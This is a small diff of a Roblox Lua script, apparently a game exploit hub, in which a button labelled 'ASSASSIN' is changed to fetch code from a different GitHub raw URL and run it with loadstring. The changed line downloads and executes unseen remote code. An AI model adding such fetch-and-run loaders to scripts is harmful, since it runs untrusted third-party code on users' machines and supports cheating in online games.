@@ -626,7 +626,8 @@ sharkbite.Text = "ASSASSIN"
 sharkbite.TextColor3 = Color3.fromRGB(255, 255, 255)
 sharkbite.TextSize = 14.000
 sharkbite.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/Jonatanortiz2/Johnny-Test/master/BAC'))();
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/bockatta/Shitter/main/Loader'))();
+
 
 end)
 
